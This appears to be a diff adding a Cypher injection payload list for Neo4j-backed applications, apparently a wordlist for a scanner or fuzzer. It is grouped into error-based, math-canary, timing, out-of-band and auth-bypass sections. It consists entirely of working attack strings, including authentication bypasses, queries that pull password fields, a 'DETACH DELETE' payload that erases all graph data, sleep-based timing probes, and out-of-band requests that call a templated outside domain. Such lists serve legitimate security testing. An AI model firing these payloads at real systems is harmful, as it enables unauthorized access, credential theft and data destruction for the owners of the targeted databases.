@@ -1,0 +1,31 @@
+##Cypher Injection - Error-Based##
+' OR 1=1 //
+') OR 1=1 //
+' UNION MATCH (n) RETURN n //
+') RETURN 1 AS x UNION MATCH (n) RETURN n.password AS x //
+' OR 1=1 WITH n RETURN n //
+') MATCH (n) DETACH DELETE n //
+
+##Cypher Injection - Math-Based (Canary: 1337)##
+' RETURN 7*191 AS x //
+') RETURN 7*191 AS x //
+' OR 1=1 RETURN 7*191 //
+') OR 1=1 RETURN toInteger(7*191) AS x //
+
+##Cypher Injection - Timing-Based##
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+') WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+' WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
+') WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
+
+##Cypher Injection - OOB##
+' CALL apoc.load.json('http://{domain}/cypher') YIELD value RETURN value //
+' LOAD CSV FROM 'http://{domain}/cypher' AS row RETURN row //
+') LOAD CSV FROM 'http://{domain}/cypher' AS row RETURN row //
+' CALL apoc.load.csv('http://{domain}/cypher') YIELD list RETURN list //
+
+##Cypher Injection - Auth Bypass / Data Extraction##
+' OR '1'='1' //
+admin'//
+' OR 1=1 RETURN u.password //
+') OR 1=1 RETURN u.password AS x //
